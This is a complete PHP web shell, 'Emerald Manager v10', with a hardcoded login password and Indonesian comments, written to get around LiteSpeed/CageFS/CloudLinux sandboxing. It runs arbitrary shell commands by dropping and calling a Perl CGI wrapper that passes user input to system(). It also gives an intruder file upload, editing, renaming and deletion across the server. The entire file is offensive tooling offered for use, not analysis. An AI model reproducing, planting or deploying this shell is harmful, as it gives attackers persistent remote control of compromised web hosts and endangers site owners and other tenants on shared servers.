<?php
/**
 * EMERALD MANAGER v10.0 - THE FINAL BYPASS
 * Specialist: LiteSpeed, CageFS, CloudLinux
 * Method: CGI/Perl Wrapper Execution
 */
session_start();
$password = 'litespeed_ghost'; 
$auth_key = 'emerald_v10_final';

// Fix Upload & Timeout
@ini_set('memory_limit', '1024M');
@set_time_limit(0);
@ini_set('post_max_size', '256M');
@ini_set('upload_max_filesize', '256M');

if (isset($_POST['p']) && $_POST['p'] === $password) { $_SESSION[$auth_key] = true; }
if (!isset($_SESSION[$auth_key])) {
    die('<html><body style="background:#000;color:#0f8;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:monospace;"><form method="POST"><div style="border:1px solid #0f8;padding:40px;"><h2>EMERALD V10 LOGIN</h2><input type="password" name="p" style="background:#000;border:1px solid #0f8;color:#0f8;padding:10px;" placeholder="KEY"><br><button type="submit" style="background:#0f8;color:#000;border:none;padding:10px 20px;cursor:pointer;font-weight:bold;margin-top:10px;width:100%;">ACCESS SYSTEM</button></div></form></body></html>');
}

// --- LOGIKA TERMINAL VIA CGI (THE ULTIMATE BYPASS) ---
function cgi_cmd($cmd) {
    $cgi_file = 'sys_exec.cgi';
    // Menentukan lokasi perl, biasanya /usr/bin/perl atau /usr/local/bin/perl
    $payload = "#!/usr/bin/perl\n";
    $payload .= "print \"Content-type: text/plain\\n\\n\";\n";
    $payload .= "system(\"$cmd 2>&1\");\n";

    @file_put_contents($cgi_file, $payload);
    @chmod($cgi_file, 0755);

    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http");
    $host = $_SERVER['HTTP_HOST'];
    $uri = dirname($_SERVER['REQUEST_URI']);
    $url = $protocol . "://" . $host . $uri . "/" . $cgi_file;

    // Menggunakan cURL untuk memicu CGI jika file_get_contents diblokir
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $out = curl_exec($ch);
    curl_close($ch);

    @unlink($cgi_file);

    if (empty($out)) {
        return "CGI FAIL: Folder ini tidak mengizinkan eksekusi CGI/Perl. Coba pindahkan shell ke folder 'cgi-bin'.";
    }
    return $out;
}

$dir = isset($_GET['d']) ? $_GET['d'] : getcwd();
$dir = str_replace('\\', '/', $dir); @chdir($dir); $dir = getcwd();
$msg = ''; $cmd_out = '';

if (isset($_POST['cmd'])) { $cmd_out = cgi_cmd($_POST['cmd']); }
if (isset($_FILES['u'])) {
    if (@move_uploaded_file($_FILES['u']['tmp_name'], $dir.'/'.$_FILES['u']['name'])) $msg = "Upload Berhasil!";
}
if (isset($_POST['act'])) {
    if ($_POST['act'] == 'save') @file_put_contents($_POST['fn'], $_POST['cnt']);
    if ($_POST['act'] == 'mkdir') @mkdir($_POST['fn']);
    if ($_POST['act'] == 'ren') @rename($_POST['old'], $_POST['new']);
}
if (isset($_GET['rm'])) { @unlink($_GET['rm']); @rmdir($_GET['rm']); $msg = "Terhapus."; }
?>
<!DOCTYPE html>
<html>
<head>
    <title>Emerald 10 - CGI Wrapper</title>
    <style>
        :root { --g: #00ff88; --b: #050505; --c: #0d1110; --border: #1f3a2f; }
        body { background: var(--b); color: #ccc; font-family: 'Consolas', monospace; margin: 0; display: flex; }
        .side { width: 320px; height: 100vh; background: var(--c); border-right: 1px solid var(--border); padding: 25px; position: fixed; box-sizing: border-box; }
        .main { margin-left: 320px; padding: 35px; width: 100%; box-sizing: border-box; overflow-y: auto; }
        .card { background: #000; border: 1px solid var(--border); padding: 20px; border-radius: 12px; margin-bottom: 25px; }
        h3 { color: var(--g); font-size: 13px; text-transform: uppercase; margin: 0 0 15px 0; border-bottom: 1px solid #1f3a2f; padding-bottom: 5px; }
        input, textarea { background: #000; border: 1px solid #333; color: var(--g); padding: 12px; width: 100%; margin-bottom: 10px; border-radius: 5px; }
        .btn { background: #008f58; color: #fff; border: none; padding: 12px; width: 100%; cursor: pointer; font-weight: bold; border-radius: 5px; }
        .btn:hover { background: var(--g); color: #000; }
        table { width: 100%; border-collapse: collapse; }
        td { padding: 10px; border-bottom: 1px solid #111; font-size: 14px; }
        pre { background: #000; color: #0f8; padding: 15px; border: 1px solid var(--g); overflow: auto; }
        .link { color: var(--g); text-decoration: none; }
    </style>
</head>
<body>
    <div class="side">
        <h2 style="color:var(--g)">EMERALD v10</h2>
        <div class="card">
            <h3>Terminal (CGI Bypass)</h3>
            <form method="POST"><input type="text" name="cmd" placeholder="ls -la / id"><button type="submit" class="btn">CGI EXECUTE</button></form>
        </div>
        <div class="card">
            <h3>File Tools</h3>
            <form method="POST" enctype="multipart/form-data"><input type="file" name="u"><button type="submit" class="btn">UPLOAD</button></form>
        </div>
        <div class="card">
            <h3>Quick Create</h3>
            <form method="POST"><input type="hidden" name="act" value="mkdir"><input type="text" name="fn" placeholder="Folder"><button type="submit" class="btn">MKDIR</button></form>
            <form method="POST" style="margin-top:10px;"><input type="hidden" name="act" value="save"><input type="text" name="fn" placeholder="File"><button type="submit" class="btn">TOUCH</button></form>
        </div>
    </div>

    <div class="main">
        <?php if($msg) echo "<div class='card' style='border-color:var(--g); color:var(--g);'>$msg</div>"; ?>
        <div class="card"><strong>Path:</strong> <span style="color:var(--g)"><?= $dir ?></span></div>

        <?php if($cmd_out): ?>
        <div class="card"><h3>Console Result:</h3><pre><?= htmlspecialchars($cmd_out) ?></pre></div>
        <?php endif; ?>

        <div class="card">
            <h3>Explorer</h3>
            <table>
                <?php
                foreach(scandir('.') as $f) {
                    if($f == '.' || $f == '..') continue;
                    echo "<tr><td>" . (is_dir($f) ? "📁 <a href='?d=".urlencode($dir."/".$f)."' class='link'>$f</a>" : "📄 $f") . "</td>";
                    echo "<td>
                        <a href='?d=".urlencode($dir)."&e=".urlencode($f)."' class='link' style='color:#00d2ff'>Edit</a> | 
                        <a href='?d=".urlencode($dir)."&rm=".urlencode($f)."' style='color:red' onclick='return confirm(\"Hapus?\")'>Del</a>
                    </td></tr>";
                }
                ?>
            </table>
        </div>

        <div class="card">
            <h3>Editor & Rename</h3>
            <form method="POST">
                <input type="hidden" name="act" value="save">
                <input type="text" name="fn" placeholder="filename.php" value="<?= isset($_GET['e'])?htmlspecialchars($_GET['e']):'' ?>">
                <textarea name="cnt" rows="15"><?php if(isset($_GET['e']) && !is_dir($_GET['e'])) echo htmlspecialchars(@file_get_contents($_GET['e'])); ?></textarea>
                <button type="submit" class="btn">SAVE FILE</button>
            </form>
            <form method="POST" style="margin-top:15px;">
                <input type="hidden" name="act" value="ren">
                <input type="text" name="old" placeholder="Old Name">
                <input type="text" name="new" placeholder="New Name">
                <button type="submit" class="btn" style="background:#333">RENAME</button>
            </form>
        </div>
    </div>
</body>
</html>
